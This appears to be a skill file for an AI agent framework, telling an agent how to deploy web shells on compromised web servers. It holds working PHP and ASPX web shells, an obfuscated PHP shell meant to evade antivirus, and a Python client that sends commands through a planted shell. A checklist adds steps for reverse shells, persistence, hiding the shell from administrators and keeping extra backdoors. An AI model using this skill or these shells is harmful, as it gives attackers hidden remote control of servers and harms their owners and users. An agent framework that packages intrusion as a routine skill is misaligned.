---
name: web-shell-deployment
description: "Use when deploying web shells on compromised servers."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [web-shell, backdoor, webserver, PHP, ASPX, JSP, file-upload, RCE]
    related_skills: [privilege-escalation-techniques, lateral-movement-pivoting, evasion-techniques-av-bypass, port-redirection-tunneling]
---

# Web Shell Deployment

Deploying web shells on compromised web servers — from PHP/ASPX/JSP shells through file upload exploitation, shell obfuscation, and persistence.

## When to Use

- Maintaining access to compromised web servers
- Exploiting file upload vulnerabilities
- Executing commands through web interfaces
- Establishing persistence on DMZ servers

## Web Shell Patterns

```python
# Minimal PHP web shell
MINIMAL_PHP = """<?php system($_GET['cmd']); ?>"""

# ASPX web shell
MINIMAL_ASPX = """<%@ Page Language="C#" %>
<% System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]); %>"""

# Obfuscated PHP (AV bypass)
OBFUSCATED_PHP = """<?php
$c = base64_decode($_POST['c']);
$f = 'c'.'r'.'e'.'a'.'t'.'e'.'_'.'f'.'u'.'n'.'c'.'t'.'i'.'o'.'n';
$fn = $f('',$c); $fn();
?>"""

class WebShellManager:
    """Manage web shells on compromised servers."""
    def __init__(self, shell_url: str, password: str = 'pwd'):
        self.url = shell_url
        self.password = password
    
    def execute(self, cmd: str) -> str:
        """Execute command via web shell."""
        import requests
        resp = requests.post(self.url, data={'pwd': self.password, 'cmd': cmd})
        return resp.text
    
    def upload_file(self, local_path: str, remote_path: str):
        """Upload file through web shell (PowerShell certutil, curl, wget)."""
        pass
```

## Verification Checklist

- [ ] File upload vulnerability identified and exploited
- [ ] Web shell uploaded (PHP/ASPX/JSP/CFM depending on server)
- [ ] Shell accessible (bypass IP restrictions, auth)
- [ ] Obfuscation applied (base64, rot13, variable function names)
- [ ] Command execution verified
- [ ] Reverse shell via web shell (PowerShell one-liner, nc, python)
- [ ] Persistence established (scheduled task, cron, startup folder)
- [ ] Shell hidden from directory listing and admin UI
- [ ] Alternative access (multiple shells, different paths)
- [ ] Cleanup plan (remove shells at engagement end)
